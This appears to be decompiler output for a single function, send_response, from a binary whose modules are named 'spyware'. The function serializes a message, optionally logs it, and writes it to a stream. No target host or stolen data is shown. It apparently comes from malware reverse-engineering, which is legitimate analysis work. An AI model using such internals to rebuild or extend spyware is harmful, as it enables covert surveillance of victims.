
  fn spyware::communication::server::send_response::h17eae7eef2507d79(arg1: *mut i64, arg2: i64) -> *mut *mut c_void

{
    let mut var_88: i64 = arg2;
    let mut var_78: *mut *mut [i8; 0xd8];
    spyware::communication::serialization::serialize_message::hd905e118d95099f9(&var_78, arg1);
    let rax_1: *mut *mut [i8; 0xd8] = var_78;
    let result_1: *mut *mut c_void;
    let mut result: *mut *mut c_void = result_1;
    
    if -(rax_1) != -0x8000000000000000
    {
        let mut var_a0: *mut *mut [i8; 0xd8] = rax_1;
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
        {
            let mut var_80: *mut i64 = &var_a0;
            let mut var_48: *mut *mut i64 = &var_80;
            let var_40_1: fn(arg1: *mut i64, arg2: *mut c_void) -> i64 =
                _$LT$$RF$T$u20$as$u20$core..fmt..Debug$GT$::fmt::h08d9ba86704c45fa;
            var_78 = &data_4b8ae8;
            let var_70: i64 = 1;
            let var_58_1: i64 = 0;
            let var_68_1: *mut *mut *mut i64 = &var_48;
            let var_60_1: i64 = 1;
            let rax_3: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8af8);
            let mut var_38: *const i8 = "spyware::communication::serverUn…";
            let var_30_1: i64 = 0x1e;
            let var_28_1: *const i8 = "spyware::communication::serverUn…";
            let var_20_1: i64 = 0x1e;
            let var_18_1: i64 = rax_3;
            log::__private_api::log::h13afddf373bd7d7f(&var_78, 4, &var_38);
        }
        
        let var_68: u64;
        result = std::io::Write::write_all::h86cd82e88e6fd894(&var_88, result, var_68);
        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h5aa1feab37440eed(&var_a0);
        
        if result == 0
        {
            return nullptr;
        }
    }
    
    result
}
